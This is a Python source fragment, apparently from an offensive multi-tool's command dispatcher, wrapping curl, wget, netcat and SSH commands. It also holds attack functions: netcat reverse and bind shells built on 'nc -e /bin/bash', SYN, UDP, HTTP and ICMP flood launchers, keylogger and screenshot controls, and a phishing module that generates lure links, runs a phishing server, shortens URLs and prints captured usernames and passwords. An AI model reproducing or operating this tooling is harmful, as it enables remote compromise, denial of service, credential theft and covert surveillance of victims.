    def _curl_dns(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: curl_dns <url>'}
        return self._generic(f'curl -s --doh-url https://dns.google/dns-query {args[0]}')
    
    def _curl_resolve(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_resolve <url> <host> <ip>'}
        return self._generic(f'curl -s --resolve {args[1]}:443:{args[2]} {args[0]}')
    
    def _curl_connect_to(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: curl_connect_to <url> <host> <port>'}
        return self._generic(f'curl -s --connect-to {args[1]}:{args[2]} {args[0]}')
    
    def _curl_unix_socket(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: curl_unix_socket <url> <socket>'}
        return self._generic(f'curl -s --unix-socket {args[1]} {args[0]}')
    
    # Wget methods (70+)
    def _wget(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget <url>'}
        result = self.tools.wget(args[0])
        return {'success': result.success, 'output': result.output}
    
    def _wget_output(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output <url> <file>'}
        return self._generic(f'wget -O {args[1]} {args[0]}')
    
    def _wget_continue(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_continue <url>'}
        return self._generic(f'wget -c {args[0]}')
    
    def _wget_background(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_background <url>'}
        return self._generic(f'wget -b {args[0]}')
    
    def _wget_quiet(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_quiet <url>'}
        return self._generic(f'wget -q {args[0]}')
    
    def _wget_recursive(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_recursive <url>'}
        return self._generic(f'wget -r {args[0]}')
    
    def _wget_mirror(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_mirror <url>'}
        return self._generic(f'wget -m {args[0]}')
    
    def _wget_spider(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_spider <url>'}
        return self._generic(f'wget --spider {args[0]}')
    
    def _wget_input(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_input <file>'}
        return self._generic(f'wget -i {args[0]}')
    
    def _wget_header(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_header <url> <header>'}
        return self._generic(f'wget --header="{args[1]}" {args[0]}')
    
    def _wget_user_agent(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user_agent <url> <agent>'}
        return self._generic(f'wget --user-agent="{args[1]}" {args[0]}')
    
    def _wget_referer(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_referer <url> <referer>'}
        return self._generic(f'wget --referer={args[1]} {args[0]}')
    
    def _wget_cookies(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_save_cookies(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_save_cookies <url> <file>'}
        return self._generic(f'wget --save-cookies={args[1]} {args[0]}')
    
    def _wget_limit_rate(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_limit_rate <url> <rate>'}
        return self._generic(f'wget --limit-rate={args[1]} {args[0]}')
    
    def _wget_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_timeout <url> <sec>'}
        return self._generic(f'wget --timeout={args[1]} {args[0]}')
    
    def _wget_tries(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_tries <url> <count>'}
        return self._generic(f'wget --tries={args[1]} {args[0]}')
    
    def _wget_retry(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_retry <url>'}
        return self._generic(f'wget --retry-connrefused {args[0]}')
    
    def _wget_no_check_cert(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_check_cert <url>'}
        return self._generic(f'wget --no-check-certificate {args[0]}')
    
    def _wget_certificate(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_certificate <url> <cert>'}
        return self._generic(f'wget --certificate={args[1]} {args[0]}')
    
    def _wget_private_key(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_private_key <url> <key>'}
        return self._generic(f'wget --private-key={args[1]} {args[0]}')
    
    def _wget_ca_certificate(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_ca_certificate <url> <ca>'}
        return self._generic(f'wget --ca-certificate={args[1]} {args[0]}')
    
    def _wget_proxy(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_proxy <url> <proxy>'}
        return self._generic(f'wget -e use_proxy=yes -e http_proxy={args[1]} {args[0]}')
    
    def _wget_no_proxy(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_proxy <url>'}
        return self._generic(f'wget --no-proxy {args[0]}')
    
    def _wget_user(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_user <url> <user>'}
        return self._generic(f'wget --user={args[1]} {args[0]}')
    
    def _wget_password(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_password <url> <pass>'}
        return self._generic(f'wget --password={args[1]} {args[0]}')
    
    def _wget_post_data(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_data <url> <data>'}
        return self._generic(f'wget --post-data="{args[1]}" {args[0]}')
    
    def _wget_post_file(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_post_file <url> <file>'}
        return self._generic(f'wget --post-file={args[1]} {args[0]}')
    
    def _wget_method(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_method <url> <method>'}
        return self._generic(f'wget --method={args[1]} {args[0]}')
    
    def _wget_timestamping(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_timestamping <url>'}
        return self._generic(f'wget -N {args[0]}')
    
    def _wget_no_clobber(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_clobber <url>'}
        return self._generic(f'wget -nc {args[0]}')
    
    def _wget_delete_after(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_delete_after <url>'}
        return self._generic(f'wget --delete-after {args[0]}')
    
    def _wget_progress(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_progress <url>'}
        return self._generic(f'wget --progress=bar {args[0]}')
    
    def _wget_show_progress(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_show_progress <url>'}
        return self._generic(f'wget --show-progress {args[0]}')
    
    def _wget_config(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_config <file>'}
        return self._generic(f'wget --config={args[0]}')
    
    def _wget_append_output(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_append_output <url> <file>'}
        return self._generic(f'wget -a {args[1]} {args[0]}')
    
    def _wget_output_file(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_output_file <url> <file>'}
        return self._generic(f'wget -o {args[1]} {args[0]}')
    
    def _wget_no_parent(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_parent <url>'}
        return self._generic(f'wget -np {args[0]}')
    
    def _wget_cut_dirs(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_cut_dirs <url> <count>'}
        return self._generic(f'wget --cut-dirs={args[1]} {args[0]}')
    
    def _wget_directory_prefix(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_directory_prefix <url> <dir>'}
        return self._generic(f'wget -P {args[1]} {args[0]}')
    
    def _wget_convert_links(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_convert_links <url>'}
        return self._generic(f'wget -k {args[0]}')
    
    def _wget_backup_converted(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_backup_converted <url>'}
        return self._generic(f'wget -K {args[0]}')
    
    def _wget_adjust_extension(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_adjust_extension <url>'}
        return self._generic(f'wget -E {args[0]}')
    
    def _wget_restrict_file_names(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_restrict_file_names <url>'}
        return self._generic(f'wget --restrict-file-names=unix {args[0]}')
    
    def _wget_trust_server_names(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_trust_server_names <url>'}
        return self._generic(f'wget --trust-server-names {args[0]}')
    
    def _wget_content_disposition(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_content_disposition <url>'}
        return self._generic(f'wget --content-disposition {args[0]}')
    
    def _wget_random_wait(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_random_wait <url>'}
        return self._generic(f'wget --random-wait {args[0]}')
    
    def _wget_wait(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_wait <url> <sec>'}
        return self._generic(f'wget -w {args[1]} {args[0]}')
    
    def _wget_waitretry(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_waitretry <url> <sec>'}
        return self._generic(f'wget --waitretry={args[1]} {args[0]}')
    
    def _wget_quota(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_quota <url> <quota>'}
        return self._generic(f'wget -Q {args[1]} {args[0]}')
    
    def _wget_dns_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_dns_timeout <url> <sec>'}
        return self._generic(f'wget --dns-timeout={args[1]} {args[0]}')
    
    def _wget_connect_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_connect_timeout <url> <sec>'}
        return self._generic(f'wget --connect-timeout={args[1]} {args[0]}')
    
    def _wget_read_timeout(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_read_timeout <url> <sec>'}
        return self._generic(f'wget --read-timeout={args[1]} {args[0]}')
    
    def _wget_inet4(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet4 <url>'}
        return self._generic(f'wget -4 {args[0]}')
    
    def _wget_inet6(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_inet6 <url>'}
        return self._generic(f'wget -6 {args[0]}')
    
    def _wget_prefer_family(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_prefer_family <url> <family>'}
        return self._generic(f'wget --prefer-family={args[1]} {args[0]}')
    
    def _wget_bind_address(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_bind_address <url> <ip>'}
        return self._generic(f'wget --bind-address={args[1]} {args[0]}')
    
    def _wget_no_dns_cache(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_dns_cache <url>'}
        return self._generic(f'wget --no-dns-cache {args[0]}')
    
    def _wget_no_http_keep_alive(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_http_keep_alive <url>'}
        return self._generic(f'wget --no-http-keep-alive {args[0]}')
    
    def _wget_no_cache(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cache <url>'}
        return self._generic(f'wget --no-cache {args[0]}')
    
    def _wget_no_cookies(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_cookies <url>'}
        return self._generic(f'wget --no-cookies {args[0]}')
    
    def _wget_load_cookies(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_load_cookies <url> <file>'}
        return self._generic(f'wget --load-cookies={args[1]} {args[0]}')
    
    def _wget_keep_session_cookies(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: wget_keep_session_cookies <url> <file>'}
        return self._generic(f'wget --keep-session-cookies --save-cookies={args[1]} {args[0]}')
    
    def _wget_help(self, args):
        return self._generic('wget --help')
    
    def _wget_version(self, args):
        return self._generic('wget --version')
    
    def _wget_ftp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_ftp <ftp_url>'}
        return self._generic(f'wget {args[0]}')
    
    def _wget_ftp_recursive(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_ftp_recursive <ftp_url>'}
        return self._generic(f'wget -r -l inf {args[0]}')
    
    def _wget_https_only(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_https_only <url>'}
        return self._generic(f'wget --https-only {args[0]}')
    
    def _wget_no_iri(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_no_iri <url>'}
        return self._generic(f'wget --no-iri {args[0]}')
    
    def _wget_iri(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: wget_iri <url>'}
        return self._generic(f'wget --iri {args[0]}')
    
    # Netcat methods (25+)
    def _netcat(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: netcat <host> <port>'}
        result = self.tools.netcat(args[0], int(args[1]))
        return {'success': result.success, 'output': result.output}
    
    def _nc_listen(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: nc_listen <port>'}
        return self._generic(f'nc -lvp {args[0]}')
    
    def _nc_scan(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_scan <host> <ports>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}')
    
    def _nc_transfer(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_transfer <host> <port> <file>'}
        return self._generic(f'nc {args[0]} {args[1]} < {args[2]}')
    
    def _nc_shell(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_shell <host> <port>'}
        return self._generic(f'nc {args[0]} {args[1]} -e /bin/bash')
    
    def _nc_reverse(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_reverse <host> <port>'}
        return self._generic(f'nc -e /bin/bash {args[0]} {args[1]}')
    
    def _nc_banner(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_banner <host> <port>'}
        return self._generic(f'echo "" | nc -v {args[0]} {args[1]}')
    
    def _nc_port_scan(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_port_scan <host> <start> <end>'}
        return self._generic(f'nc -zv {args[0]} {args[1]}-{args[2]}')
    
    def _nc_udp(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_udp <host> <port>'}
        return self._generic(f'nc -u {args[0]} {args[1]}')
    
    def _nc_hex(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_hex <host> <port>'}
        return self._generic(f'nc -x {args[0]} {args[1]}')
    
    def _nc_verbose(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_verbose <host> <port>'}
        return self._generic(f'nc -v {args[0]} {args[1]}')
    
    def _nc_zero_io(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_zero_io <host> <port>'}
        return self._generic(f'nc -zv -w 1 {args[0]} {args[1]}')
    
    def _nc_exec(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_exec <host> <port> <command>'}
        return self._generic(f'echo "{args[2]}" | nc {args[0]} {args[1]}')
    
    def _nc_proxy(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_proxy <host> <port> <proxy>'}
        return self._generic(f'nc -x {args[2]} {args[0]} {args[1]}')
    
    def _nc_ssl(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_ssl <host> <port>'}
        return self._generic(f'ncat --ssl {args[0]} {args[1]}')
    
    def _nc_keep_open(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_keep_open <host> <port>'}
        return self._generic(f'nc -k -l {args[0]} {args[1]}')
    
    def _nc_source_port(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_source_port <host> <port> <source_port>'}
        return self._generic(f'nc -p {args[2]} {args[0]} {args[1]}')
    
    def _nc_timeout(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_timeout <host> <port> <sec>'}
        return self._generic(f'nc -w {args[2]} {args[0]} {args[1]}')
    
    def _nc_wait(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_wait <host> <port> <sec>'}
        return self._generic(f'nc -w {args[2]} -l {args[0]} {args[1]}')
    
    def _nc_broadcast(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_broadcast <host> <port>'}
        return self._generic(f'nc -b {args[0]} {args[1]}')
    
    def _nc_multicast(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_multicast <host> <port>'}
        return self._generic(f'nc -u -b {args[0]} {args[1]}')
    
    def _nc_interface(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: nc_interface <host> <port> <iface>'}
        return self._generic(f'nc -i {args[2]} {args[0]} {args[1]}')
    
    def _nc_numeric(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: nc_numeric <host> <port>'}
        return self._generic(f'nc -n {args[0]} {args[1]}')
    
    # SSH methods (15+)
    def _ssh_add(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_add <name> <host> <username> [password]'}
        conn = self.ssh.add_connection(args[0], args[1], args[2], args[3] if len(args) > 3 else None)
        return {'success': True, 'output': f"SSH connection added: {conn.name} (ID: {conn.id})"}
    
    def _ssh_list(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        connections = self.ssh.get_connections()
        if not connections:
            return {'success': True, 'output': 'No SSH connections configured'}
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn.get('connected') else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return {'success': True, 'output': output}
    
    def _ssh_connect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_connect <conn_id>'}
        if self.ssh.connect(args[0]):
            return {'success': True, 'output': f"Connected to {args[0]}"}
        return {'success': False, 'output': f"Failed to connect to {args[0]}"}
    
    def _ssh_exec(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        result = self.ssh.execute_command(args[0], ' '.join(args[1:]))
        return {'success': result.success, 'output': result.output}
    
    def _ssh_disconnect(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: ssh_disconnect <conn_id>'}
        self.ssh.disconnect(args[0])
        return {'success': True, 'output': f"Disconnected from {args[0]}"}
    
    def _ssh_upload(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_upload <conn_id> <local> <remote>'}
        return self._generic(f'scp {args[1]} {args[0]}:{args[2]}')
    
    def _ssh_download(self, args):
        if not self.ssh:
            return {'success': False, 'output': 'SSH manager not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_download <conn_id> <remote> <local>'}
        return self._generic(f'scp {args[0]}:{args[1]} {args[2]}')
    
    def _ssh_tunnel(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_tunnel <local_port> <remote_host> <remote_port>'}
        return self._generic(f'ssh -L {args[0]}:{args[1]}:{args[2]} localhost')
    
    def _ssh_reverse_tunnel(self, args):
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_reverse_tunnel <remote_port> <local_host> <local_port>'}
        return self._generic(f'ssh -R {args[0]}:{args[1]}:{args[2]} localhost')
    
    def _ssh_proxy(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_proxy <host>'}
        return self._generic(f'ssh -D 1080 -N {args[0]}')
    
    def _ssh_scp(self, args):
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_scp <source> <destination>'}
        return self._generic(f'scp {args[0]} {args[1]}')
    
    def _ssh_sftp(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_sftp <host>'}
        return self._generic(f'sftp {args[0]}')
    
    def _ssh_keyscan(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_keyscan <host>'}
        return self._generic(f'ssh-keyscan {args[0]}')
    
    def _ssh_keygen(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: ssh_keygen <type> [comment]'}
        return self._generic(f'ssh-keygen -t {args[0]} -C "{args[1] if len(args) > 1 else "yong-nian-v1"}"')
    
    def _ssh_agent(self, args):
        return self._generic('ssh-agent -s')
    
    # DOS methods
    def _dos_syn(self, args):
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_syn <ip> <port> <duration> [threads]'}
        return self.dos.syn_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_udp(self, args):
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_udp <ip> <port> <duration> [threads]'}
        return self.dos.udp_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_http(self, args):
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: dos_http <ip> <port> <duration> [threads]'}
        return self.dos.http_flood(args[0], int(args[1]), int(args[2]), int(args[3]) if len(args) > 3 else 50)
    
    def _dos_icmp(self, args):
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dos_icmp <ip> <duration> [threads]'}
        return self.dos.icmp_flood(args[0], int(args[1]), int(args[2]) if len(args) > 2 else 50)
    
    def _dos_stop(self, args):
        if not self.dos:
            return {'success': False, 'output': 'DOS engine not initialized'}
        if self.dos.stop(args[0] if args else None):
            return {'success': True, 'output': 'DOS attack stopped'}
        return {'success': False, 'output': 'Failed to stop DOS attack'}
    
    # Keylogger methods
    def _keylogger_start(self, args):
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        if self.keylogger.start():
            return {'success': True, 'output': 'Keylogger started (Press F10 to stop)'}
        return {'success': False, 'output': 'Failed to start keylogger'}
    
    def _keylogger_stop(self, args):
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        self.keylogger.stop()
        return {'success': True, 'output': 'Keylogger stopped'}
    
    def _keylogger_status(self, args):
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        status = "🟢 Running" if self.keylogger.running else "🔴 Stopped"
        return {'success': True, 'output': f"Keylogger Status: {status}"}
    
    def _keylogger_logs(self, args):
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        limit = int(args[0]) if args else 20
        logs = self.keylogger.get_keylogs(limit)
        if not logs:
            return {'success': True, 'output': 'No keylogs found'}
        output = f"Keylogger Logs ({len(logs)}):\n"
        for log in logs:
            output += f"\n[{log.get('timestamp', '')[:19]}]\n{log.get('text', '')[:200]}\n"
        return {'success': True, 'output': output}
    
    def _keylogger_screenshots(self, args):
        if not self.keylogger:
            return {'success': False, 'output': 'Keylogger not initialized'}
        screenshots = self.keylogger.get_screenshots()
        if not screenshots:
            return {'success': True, 'output': 'No screenshots captured'}
        output = "Screenshots:\n"
        for s in screenshots:
            output += f"  • {s}\n"
        return {'success': True, 'output': output}
    
    # Phishing methods
    def _phish(self, platform):
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"🎣 Phishing link generated for {platform}\n"
            output += f"Link ID: {result['link_id']}\nURL: {result['url']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return {'success': True, 'output': output}
        return {'success': False, 'output': 'Failed to generate phishing link'}
    
    def _phish_custom(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phish_custom <name>'}
        result = self.social.generate_phishing_link('custom')
        if result['success']:
            self.social.active_links[result['link_id']]['platform'] = args[0]
            return {'success': True, 'output': f"🎣 Custom phishing link generated: {result['link_id']}\nURL: {result['url']}"}
        return {'success': False, 'output': 'Failed to generate custom phishing link'}
    
    def _phish_start(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phish_start <link_id> [port]'}
        port = int(args[1]) if len(args) > 1 else None
        if self.social.start_server(args[0], port):
            url = self.social.phishing_server.get_url()
            return {'success': True, 'output': f"🎣 Phishing server started at {url}"}
        return {'success': False, 'output': f"Failed to start server for link {args[0]}"}
    
    def _phish_stop(self, args):
        self.social.stop_server()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _phish_creds(self, args):
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        if not creds:
            return {'success': True, 'output': 'No captured credentials'}
        output = f"📧 Captured Credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']}:{c['password']} from {c['ip_address']}\n"
        return {'success': True, 'output': output}
    
    def _phish_list(self, args):
        links = self.db.get_phishing_links()
        if not links:
            return {'success': True, 'output': 'No phishing links found'}
        output = "🎣 Phishing Links:\n"
        for l in links:
            output += f"  • {l['id']} - {l['platform']} (Clicks: {l['clicks']})\n"
            if l.get('host_ip'):
                output += f"    URL: http://{l['host_ip']}:{l.get('host_port', 8080)}\n"
        return {'success': True, 'output': output}
    
    def _phish_templates(self, args):
        templates = self.social.list_templates()
        output = f"🎣 Available Phishing Templates ({len(templates)}):\n"
        for t in sorted(templates):
            output += f"  • phish_{t}\n"
        return {'success': True, 'output': output}
    
    def _phish_shorten(self, args):
        if not args:
            return {'success': False, 'output': 'Usage: phish_shorten <url>'}
        shortened = self.social.shorten_link(args[0])
        if shortened:
            return {'success': True, 'output': f"Shortened URL: {shortened}"}
        return {'success': False, 'output': 'Could not shorten URL'}
    
    # Binary Analysis methods
    def _binary_analyze(self, args):
        if not self.binary:
            return {'success': False, 'output': 'Binary analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: binary_analyze <file_path>'}
        
        result = self.binary.analyze_binary(args[0])
        
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        output = f"🔬 Binary Analysis: {args[0]}\n"
        output += "=" * 50 + "\n"
        output += f"File Type: {result.get('file_type', 'Unknown')}\n"
        output += f"Architecture: {result.get('architecture', 'Unknown')}\n"
        output += f"Sections: {len(result.get('sections', []))}\n"
        output += f"Imports: {len(result.get('imports', []))}\n"
        output += f"Exports: {len(result.get('exports', []))}\n"
        output += f"Strings: {len(result.get('strings', []))}\n"
        output += f"Vulnerabilities: {len(result.get('vulnerabilities', []))}\n"
        
        if result.get('vulnerabilities'):
            output += "\nVulnerabilities Found:\n"
            for v in result['vulnerabilities'][:10]:
                output += f"  • {v.get('type')}: {v.get('description')} ({v.get('severity')})\n"
        
        return {'success': True, 'output': output}
    
    def _binary_strings(self, args):
        if not self.binary:
            return {'success': False, 'output': 'Binary analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: binary_strings <file_path>'}
        
        result = self.binary.analyze_binary(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        strings = result.get('strings', [])
        output = f"📝 Strings in {args[0]} ({len(strings)} found):\n"
        for s in strings[:100]:
            output += f"  {s}\n"
        if len(strings) > 100:
            output += f"  ... and {len(strings) - 100} more"
        
        return {'success': True, 'output': output}
    
    def _binary_disassemble(self, args):
        if not self.binary:
            return {'success': False, 'output': 'Binary analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: binary_disassemble <file_path>'}
        
        result = self.binary.analyze_binary(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        disasm = result.get('disassembly', [])
        output = f"🔧 Disassembly of {args[0]} ({len(disasm)} instructions):\n"
        for insn in disasm[:50]:
            output += f"  {insn.get('address')}: {insn.get('mnemonic')} {insn.get('op_str')}\n"
        if len(disasm) > 50:
            output += f"  ... and {len(disasm) - 50} more"
        
        return {'success': True, 'output': output}
    
    def _binary_imports(self, args):
        if not self.binary:
            return {'success': False, 'output': 'Binary analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: binary_imports <file_path>'}
        
        result = self.binary.analyze_binary(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        imports = result.get('imports', [])
        output = f"📥 Imports in {args[0]} ({len(imports)} found):\n"
        for imp in imports:
            output += f"  {imp}\n"
        
        return {'success': True, 'output': output}
    
    def _binary_exports(self, args):
        if not self.binary:
            return {'success': False, 'output': 'Binary analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: binary_exports <file_path>'}
        
        result = self.binary.analyze_binary(args[0])
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        exports = result.get('exports', [])
        output = f"📤 Exports in {args[0]} ({len(exports)} found):\n"
        for exp in exports:
            output += f"  {exp}\n"
        
        return {'success': True, 'output': output}
    
    # APK Analysis methods
    def _apk_analyze(self, args):
        if not self.apk:
            return {'success': False, 'output': 'APK analyzer not initialized'}
        if not args:
            return {'success': False, 'output': 'Usage: apk_analyze <apk_path>'}
        
        result = self.apk.analyze_apk(args[0])
        
        if not result.get('success'):
            return {'success': False, 'output': f"Error: {result.get('error')}"}
        
        output = f"📱 APK Analysis: {args[0]}\n"
        output += "=" * 50 + "\n"
        output += f"Package: {result.get('package_name', 'Unknown')}\n"
        output += f"Version: {result.get('version', 'Unknown')}\n"
        output += f"Main Activity: {result.get('main_activity', 'Unknown')}\n"
        output += f"Permissions: {len(result.get('permissions', []))}\n"
        output += f"Activities: {len(result.get('activities', []))}\n"
        output += f"Services: {len(result.get('services', []))}\n"
        output += f"Libraries: {len(result.get('libraries', []))}\n"
        
        if result.get('permissions'):
            output += "\nPermissions:\n"
            for perm in result['permissions'][:20]:
                output += f"  • {perm}\n"
        
        return {'success': True, 'output': output}
